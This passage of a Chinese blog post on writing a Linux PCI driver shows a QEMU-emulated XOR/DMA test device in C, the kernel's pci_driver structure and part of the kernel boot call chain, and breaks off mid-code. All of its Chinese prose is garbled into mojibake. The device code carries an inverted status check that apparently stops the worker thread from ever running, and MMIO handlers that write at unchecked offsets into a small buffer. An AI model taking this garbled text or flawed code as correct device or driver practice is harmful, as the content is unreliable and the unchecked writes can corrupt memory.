è‡ªå·±é€ çš„ PCI è®¾å¤‡</strong>ï¼Œé‚£è¿™ä¸ªæ—¶å€™æˆ‘ä»¬åªå¥½è‡ªå·±åŠ¨æ‰‹å†™ä¸€ä¸ªé©±åŠ¨äº†ï¼šï¼‰</p><h2 id="ã€‡ã€QEMU-PCI-è®¾å¤‡æ¨¡æ‹Ÿ">ã€‡ã€QEMU PCI è®¾å¤‡æ¨¡æ‹Ÿ</h2><p>å› ä¸ºç¬”è€…ç¡®å®æ²¡æœ‰æ¡ä»¶æ‰‹æ“ä¸€ä¸ª PCI è®¾å¤‡ï¼Œæ‰€ä»¥è¿™é‡Œåªå¥½ç”¨ QEMU æ¥æ¨¡æ‹Ÿä¸€ä¸ªï¼Œç¬”è€…è¿™é‡Œå®ç°äº†ä¸€ä¸ªé€šè¿‡ DMA æä¾›ç®€å•çš„æ•°æ®å¼‚æˆ–åŠŸèƒ½çš„ PCI è®¾å¤‡</p><blockquote><p>å…³äºæœ€åŸºç¡€çš„ QEMU è®¾å¤‡ç¼–å†™ã€QOM ç­‰ï¼Œå‚è§<a href="https://arttnba3.cn/2022/07/15/VIRTUALIZATION-0X00-QEMU-PART-I/#0x03-%E7%AE%80%E6%98%93-QEMU-%E8%AE%BE%E5%A4%87%E7%BC%96%E5%86%99">è¿™é‡Œ</a></p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * arttnba3 PCI test device</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * Copyright (c) 2022 arttnba3</span><br><span class="hljs-comment"> * Author: arttnba3 &lt;arttnba@gmail.com&gt;</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * This programme is just a simple pci device,</span><br><span class="hljs-comment"> * which is cerated for my own learning about qemu.</span><br><span class="hljs-comment"> * You can modify and use it freely.</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;qemu/osdep.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;hw/pci/pci.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;hw/qdev-properties.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;qemu/event_notifier.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;qemu/module.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;sysemu/kvm.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;qom/object.h&quot;</span></span><br><br><span class="hljs-class"><span class="hljs-keyword">enum</span> &#123;</span><br>    A3DEV_STATUS_INIT = <span class="hljs-number">0</span>,<br>    A3DEV_STATUS_READY,<br>    A3DEV_STATUS_RUNNING,<br>    A3DEV_STATUS_STOPPING,<br><br>    A3DEV_STATUS_TYPES,<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">enum</span> &#123;</span><br>    A3DEV_REGS_STATUS = <span class="hljs-number">0</span>,<br>    A3DEV_REGS_INSN,<br><br>    A3DEV_REGS_TYPES,<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">enum</span> &#123;</span><br>    A3DEV_INSN_START = <span class="hljs-number">0</span>,<br>    A3DEV_INSN_STOP,<br><br>    A3DEV_INSN_TYPES,<br>&#125;;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">A3EncBufferInfo</span> &#123;</span><br>    <span class="hljs-comment">/*&lt; public &gt;*/</span><br>    <span class="hljs-type">dma_addr_t</span> addr;<br>    <span class="hljs-type">uint8_t</span> val;<br>    <span class="hljs-type">uint32_t</span> len;<br>&#125; A3EncBufferInfo;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">A3PCIDevState</span> &#123;</span><br>    <span class="hljs-comment">/*&lt; private &gt;*/</span><br>    PCIDevice parent_obj;<br><br>    <span class="hljs-comment">/*&lt; public &gt;*/</span><br>    MemoryRegion mmio;<br>    MemoryRegion pmio;<br>    <span class="hljs-type">uint64_t</span> regs[A3DEV_REGS_TYPES];<br>    A3EncBufferInfo enc_buf;<br><br>    QemuThread thread;<br>    QemuMutex lock;<br>&#125; A3PCIDevState;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">A3PCIDevClass</span> &#123;</span><br>    <span class="hljs-comment">/*&lt; private &gt;*/</span><br>    PCIDeviceClass parent;<br>&#125; A3PCIDevClass;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TYPE_A3DEV_PCI <span class="hljs-string">&quot;a3dev-pci&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> A3DEV_PCI(obj) \</span><br><span class="hljs-meta">    OBJECT_CHECK(A3PCIDevState, (obj), TYPE_A3DEV_PCI)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> A3DEV_PCI_GET_CLASS(obj) \</span><br><span class="hljs-meta">    OBJECT_GET_CLASS(A3PCIDevClass, obj, TYPE_A3DEV_PCI)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> A3DEV_PCI_CLASS(klass) \</span><br><span class="hljs-meta">    OBJECT_CLASS_CHECK(A3PCIDevClass, klass, TYPE_A3DEV_PCI)</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> *<span class="hljs-title function_">a3dev_worker_thread</span><span class="hljs-params">(<span class="hljs-type">void</span> *arg)</span><br>&#123;<br>    A3PCIDevState *ds = A3DEV_PCI(arg);<br>    <span class="hljs-type">uint8_t</span> cb;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">uint32_t</span> wlen = <span class="hljs-number">0</span>; wlen &lt; ds-&gt;enc_buf.len; wlen++) &#123;<br>        <span class="hljs-keyword">if</span> (ds-&gt;regs[A3DEV_REGS_STATUS] != A3DEV_STATUS_STOPPING) &#123;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        pci_dma_read(&amp;ds-&gt;parent_obj, ds-&gt;enc_buf.addr, &amp;cb, <span class="hljs-number">1</span>);<br>        cb ^= ds-&gt;enc_buf.val;<br>        pci_dma_write(&amp;ds-&gt;parent_obj, ds-&gt;enc_buf.addr, &amp;cb, <span class="hljs-number">1</span>);<br>    &#125;<br><br>    ds-&gt;regs[A3DEV_REGS_STATUS] = A3DEV_STATUS_READY;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">uint64_t</span><br><span class="hljs-title function_">a3dev_mmio_read</span><span class="hljs-params">(<span class="hljs-type">void</span> *opaque, hwaddr addr, <span class="hljs-type">unsigned</span> size)</span><br>&#123;<br>    A3PCIDevState *ds = A3DEV_PCI(opaque);<br><br>    <span class="hljs-keyword">return</span> *(<span class="hljs-type">uint64_t</span>*)(((<span class="hljs-type">uint8_t</span>*) &amp;ds-&gt;enc_buf) + addr);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">a3dev_mmio_write</span><span class="hljs-params">(<span class="hljs-type">void</span> *opaque, hwaddr addr, <span class="hljs-type">uint64_t</span> val, <span class="hljs-type">unsigned</span> size)</span><br>&#123;<br>    A3PCIDevState *ds = A3DEV_PCI(opaque);<br><br>    <span class="hljs-keyword">if</span> (ds-&gt;regs[A3DEV_REGS_STATUS] != A3DEV_STATUS_READY) &#123;<br>        <span class="hljs-keyword">return</span> ;<br>    &#125;<br><br>    <span class="hljs-keyword">switch</span> (size) &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>        *(<span class="hljs-type">uint8_t</span>*)(((<span class="hljs-type">uint8_t</span>*) &amp;ds-&gt;enc_buf ) + addr) = val;<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>        *(<span class="hljs-type">uint16_t</span>*)(((<span class="hljs-type">uint8_t</span>*) &amp;ds-&gt;enc_buf ) + addr) = val;<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>        *(<span class="hljs-type">uint32_t</span>*)(((<span class="hljs-type">uint8_t</span>*) &amp;ds-&gt;enc_buf ) + addr) = val;<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">8</span>:<br>        *(<span class="hljs-type">uint64_t</span>*)(((<span class="hljs-type">uint8_t</span>*) &amp;ds-&gt;enc_buf ) + addr) = val;<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">default</span>:<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">uint64_t</span><br><span class="hljs-title function_">a3dev_pmio_read</span><span class="hljs-params">(<span class="hljs-type">void</span> *opaque, hwaddr addr, <span class="hljs-type">unsigned</span> size)</span><br>&#123;<br>    A3PCIDevState *ds = A3DEV_PCI(opaque);<br><br>    <span class="hljs-keyword">switch</span> (addr) &#123;<br>        <span class="hljs-keyword">case</span> A3DEV_REGS_STATUS:<br>            <span class="hljs-keyword">return</span> ds-&gt;regs[A3DEV_REGS_STATUS];<br>        <span class="hljs-keyword">default</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">a3dev_pmio_write</span><span class="hljs-params">(<span class="hljs-type">void</span> *opaque, hwaddr addr, <span class="hljs-type">uint64_t</span> val, <span class="hljs-type">unsigned</span> size)</span><br>&#123;<br>    A3PCIDevState *ds = A3DEV_PCI(opaque);<br><br>    qemu_mutex_lock(&amp;ds-&gt;lock);<br><br>    <span class="hljs-keyword">switch</span> (addr) &#123;<br>        <span class="hljs-keyword">case</span> A3DEV_REGS_INSN:<br>            <span class="hljs-keyword">switch</span> (val) &#123;<br>            <span class="hljs-keyword">case</span> A3DEV_INSN_START:<br>                <span class="hljs-keyword">if</span> (ds-&gt;regs[A3DEV_REGS_STATUS] != A3DEV_STATUS_READY) &#123;<br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br>                ds-&gt;regs[A3DEV_REGS_STATUS] = A3DEV_STATUS_RUNNING;<br>                qemu_thread_create(&amp;ds-&gt;thread, <span class="hljs-string">&quot;a3dev-worker-thread&quot;</span>, <br>                                    a3dev_worker_thread, ds, <br>                                    QEMU_THREAD_DETACHED);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> A3DEV_INSN_STOP:<br>                <span class="hljs-keyword">if</span> (ds-&gt;regs[A3DEV_REGS_STATUS] != A3DEV_STATUS_RUNNING) &#123;<br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br>                ds-&gt;regs[A3DEV_REGS_STATUS] = A3DEV_STATUS_STOPPING;<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">default</span>:<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">default</span>:<br>            <span class="hljs-keyword">break</span>;<br>    &#125;<br><br>    qemu_mutex_unlock(&amp;ds-&gt;lock);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">const</span> MemoryRegionOps a3dev_mmio_ops = &#123;<br>    .read = a3dev_mmio_read,<br>    .write = a3dev_mmio_write,<br>    .endianness = DEVICE_LITTLE_ENDIAN,<br>    .valid = &#123;<br>        .max_access_size = <span class="hljs-number">4</span>,<br>        .min_access_size = <span class="hljs-number">1</span>,<br>        .unaligned = <span class="hljs-literal">true</span>,<br>    &#125;,<br>    .impl = &#123;<br>        .unaligned = <span class="hljs-literal">true</span>,<br>    &#125;,<br>&#125;;<br><br><span class="hljs-type">static</span> <span class="hljs-type">const</span> MemoryRegionOps a3dev_pmio_ops = &#123;<br>    .read = a3dev_pmio_read,<br>    .write = a3dev_pmio_write,<br>    .endianness = DEVICE_LITTLE_ENDIAN,<br>    .valid = &#123;<br>        .max_access_size = <span class="hljs-number">4</span>,<br>        .min_access_size = <span class="hljs-number">1</span>,<br>        .unaligned = <span class="hljs-literal">true</span>,<br>    &#125;,<br>    .impl = &#123;<br>        .unaligned = <span class="hljs-literal">true</span>,<br>    &#125;,<br>&#125;;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3dev_pci_realize</span><span class="hljs-params">(PCIDevice *pci_dev, Error **errp)</span><br>&#123;<br>    A3PCIDevState *ds = A3DEV_PCI(pci_dev);<br><br>    ds-&gt;regs[A3DEV_REGS_STATUS] = A3DEV_STATUS_INIT;<br><br>    memory_region_init_io(&amp;ds-&gt;mmio, OBJECT(ds), &amp;a3dev_mmio_ops,<br>                        pci_dev, <span class="hljs-string">&quot;a3dev-mmio&quot;</span>, <span class="hljs-keyword">sizeof</span>(ds-&gt;enc_buf));<br>    pci_register_bar(pci_dev, <span class="hljs-number">0</span>, PCI_BASE_ADDRESS_SPACE_MEMORY, &amp;ds-&gt;mmio);<br>    memory_region_init_io(&amp;ds-&gt;pmio, OBJECT(ds), &amp;a3dev_pmio_ops,<br>                        pci_dev, <span class="hljs-string">&quot;a3dev-pmio&quot;</span>, A3DEV_REGS_TYPES);<br>    pci_register_bar(pci_dev, <span class="hljs-number">1</span>, PCI_BASE_ADDRESS_SPACE_IO, &amp;ds-&gt;pmio);<br><br>    <span class="hljs-built_in">memset</span>(&amp;ds-&gt;enc_buf, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(ds-&gt;enc_buf));<br>    qemu_mutex_init(&amp;ds-&gt;lock);<br><br>    ds-&gt;regs[A3DEV_REGS_STATUS] = A3DEV_STATUS_READY;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3dev_instance_init</span><span class="hljs-params">(Object *obj)</span><br>&#123;<br>    <span class="hljs-comment">// do something</span><br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3dev_class_init</span><span class="hljs-params">(ObjectClass *oc, <span class="hljs-type">void</span> *data)</span><br>&#123;<br>    DeviceClass *dc = DEVICE_CLASS(oc);<br>    PCIDeviceClass *pci = PCI_DEVICE_CLASS(oc);<br><br>    pci-&gt;realize = a3dev_pci_realize;<br>    pci-&gt;vendor_id = PCI_VENDOR_ID_QEMU;<br>    pci-&gt;device_id = <span class="hljs-number">0x1919</span>;<br>    pci-&gt;revision = <span class="hljs-number">0x81</span>;<br>    pci-&gt;class_id = PCI_CLASS_OTHERS;<br><br>    dc-&gt;desc = <span class="hljs-string">&quot;arttnba3 test PCI device&quot;</span>;<br>    set_bit(DEVICE_CATEGORY_MISC, dc-&gt;categories);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">const</span> TypeInfo a3dev_type_info = &#123;<br>    .name = TYPE_A3DEV_PCI,<br>    .parent = TYPE_PCI_DEVICE,<br>    .instance_init = a3dev_instance_init,<br>    .instance_size = <span class="hljs-keyword">sizeof</span>(A3PCIDevState),<br>    .class_size = <span class="hljs-keyword">sizeof</span>(A3PCIDevClass),<br>    .class_init = a3dev_class_init,<br>    .interfaces = (InterfaceInfo[]) &#123;<br>        &#123; INTERFACE_CONVENTIONAL_PCI_DEVICE &#125;,<br>        &#123; &#125;,<br>    &#125;,<br>&#125;;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3dev_register_types</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123;<br>    type_register_static(&amp;a3dev_type_info);<br>&#125;<br><br>type_init(a3dev_register_types);<br></code></pre></td></tr></table></figure><h2 id="ä¸€ã€kernel-è¯†åˆ«-PCI-è®¾å¤‡çš„æ–¹å¼">ä¸€ã€kernel è¯†åˆ« PCI è®¾å¤‡çš„æ–¹å¼</h2><h3 id="I-åŸºæœ¬ç»“æ„">I.åŸºæœ¬ç»“æ„</h3><p>æˆ‘ä»¬é¦–å…ˆæ¥çœ‹ Linux kernel ä¸­çš„é€šç”¨è®¾å¤‡é©±åŠ¨æ¨¡å‹ï¼Œä¸»è¦ç”±ä¸‰éƒ¨åˆ†ç»„æˆï¼š<strong>æ€»çº¿ï¼ˆbusï¼‰ã€è®¾å¤‡ï¼ˆdeviceï¼‰ã€é©±åŠ¨ï¼ˆdriverï¼‰</strong>ï¼Œå…·ä½“çš„æ€»çº¿ç±»å‹éƒ½æ˜¯åŸºäºè¿™ä¸€å¥—æœºåˆ¶å»å®ç°çš„</p><p><img src="https://s2.loli.net/2022/09/01/ypQ8KYmIzbZkaUd.png" alt="å·çš„å›¾"></p><p>å¯¹äº PCI è€Œè¨€ï¼Œæ€»çº¿ä¸­çš„å„ä¸ªç»„ä»¶åœ¨ Linux kernel ä¸­å¯¹åº”çš„ç»“æ„ä½“å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="https://s2.loli.net/2022/09/01/JtUKnCN7d1BWpxz.png" alt="å·çš„å›¾"></p><p>ä¸‹é¢æ˜¯ä¸€å¼ æ›´åŠ è¯¦ç»†çš„å±•å¼€å›¾ï¼š</p><p><img src="https://s2.loli.net/2022/09/01/y5if1YWOesXJbT3.png" alt="å·çš„å›¾"></p><p>ä¸Šé¢çš„å›¾åªç”»å‡ºäº† PCI çš„æ€»çº¿ï¼ˆ<code>struct pci_bus</code>ï¼‰ä¸ PCI è®¾å¤‡ï¼ˆ<code>struct pci_dev</code>ï¼‰ï¼Œè¿˜å°‘äº†ä¸€ä¸ªé©±åŠ¨ç»“æ„ï¼Œåœ¨å†…æ ¸ä¸­ PCI é©±åŠ¨å¯¹åº”çš„å®é™…ä¸Šæ˜¯ <code>pci_driver</code> ç»“æ„ä½“ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pci_driver</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span><span class="hljs-title">node</span>;</span><br><span class="hljs-type">const</span> <span class="hljs-type">char</span>*name;<br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pci_device_id</span> *<span class="hljs-title">id_table</span>;</span><span class="hljs-comment">/* Must be non-NULL for probe to be called */</span><br><span class="hljs-type">int</span>  (*probe)(<span class="hljs-keyword">struct</span> pci_dev *dev, <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> pci_device_id *id);<span class="hljs-comment">/* New device inserted */</span><br><span class="hljs-type">void</span> (*remove)(<span class="hljs-keyword">struct</span> pci_dev *dev);<span class="hljs-comment">/* Device removed (NULL if not a hot-plug capable driver) */</span><br><span class="hljs-type">int</span>  (*suspend)(<span class="hljs-keyword">struct</span> pci_dev *dev, <span class="hljs-type">pm_message_t</span> state);<span class="hljs-comment">/* Device suspended */</span><br><span class="hljs-type">int</span>  (*resume)(<span class="hljs-keyword">struct</span> pci_dev *dev);<span class="hljs-comment">/* Device woken up */</span><br><span class="hljs-type">void</span> (*shutdown)(<span class="hljs-keyword">struct</span> pci_dev *dev);<br><span class="hljs-type">int</span>  (*sriov_configure)(<span class="hljs-keyword">struct</span> pci_dev *dev, <span class="hljs-type">int</span> num_vfs); <span class="hljs-comment">/* On PF */</span><br><span class="hljs-type">int</span>  (*sriov_set_msix_vec_count)(<span class="hljs-keyword">struct</span> pci_dev *vf, <span class="hljs-type">int</span> msix_vec_count); <span class="hljs-comment">/* On PF */</span><br>u32  (*sriov_get_vf_total_msix)(<span class="hljs-keyword">struct</span> pci_dev *pf);<br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pci_error_handlers</span> *<span class="hljs-title">err_handler</span>;</span><br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">attribute_group</span> **<span class="hljs-title">groups</span>;</span><br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">attribute_group</span> **<span class="hljs-title">dev_groups</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">device_driver</span><span class="hljs-title">driver</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pci_dynids</span><span class="hljs-title">dynids</span>;</span><br><span class="hljs-type">bool</span> driver_managed_dma;<br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="II-è¯†åˆ«è¿‡ç¨‹">II.è¯†åˆ«è¿‡ç¨‹</h3><p>è®²å®Œäº†åŸºæœ¬ç»“æ„ï¼Œç°åœ¨æˆ‘ä»¬å¯ä»¥æ¥çœ‹å†…æ ¸æ˜¯æ€ä¹ˆå»è¯†åˆ« PCI è®¾å¤‡çš„äº†ï¼Œåœ¨å†…æ ¸å¯åŠ¨åå„æ¶æ„çš„åˆå§‹åŒ–å‡½æ•°æœ€ç»ˆéƒ½ä¼šè°ƒç”¨åˆ° <code>start_kernel()</code>ï¼Œäºæ˜¯å­˜åœ¨å¦‚ä¸‹è°ƒç”¨é“¾ï¼š</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">start_kernel</span>()<br><span class="hljs-built_in">arch_call_rest_init</span>()<br><span class="hljs-built_in">rest_init</span>()<span class="hljs-comment">// å¯åŠ¨ä¸‰ä¸ªè¿›ç¨‹ idleï¼ˆ0ï¼‰ã€kernel_initï¼ˆ1ï¼‰ã€kthreaddï¼ˆ2ï¼‰</span><br><span class="hljs-built_in">kernel_init</span>()<br><span class="hljs-built_in">kernel_init_freeable</span>()<br><span class="hljs-built_in">do_basic_setup</span>()<br><span class="hljs-built_in">driver_init</span>()<br><span class="hljs-built_in">devtmpfs_init</span>()<span class="hljs-comment">// å»ºç«‹ devtmpfsï¼Œä¹‹åä¼šè¢«ç”¨æˆ·æ€initæŒ‚åˆ°/devä¸‹é¢</span><br><span class="hljs-built_in">buses_init</span>()<span class="hljs-comment">// åœ¨ sysfs æ ¹ä¸‹å»ºç«‹ bus ç›®å½•</span><br></code></pre></td></tr></table></figure><p>ä¹‹åå°±æ˜¯åˆ°å„ä¸ªæ¨¡å—çš„ init å‡½æ•°ï¼ŒæŒ‰ç…§ç¼–è¯‘é“¾æ¥é¡ºåºï¼Œæˆ‘ä»¬æ‰€å…³å¿ƒçš„ PCI ç›¸å…³å‡½æ•°çš„æ‰§è¡Œé¡ºåºåº”å½“å¦‚ä¸‹ï¼š</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">pcibus_class_init</span><span class="hljs-params">()</span></span><span class="hljs-comment">// 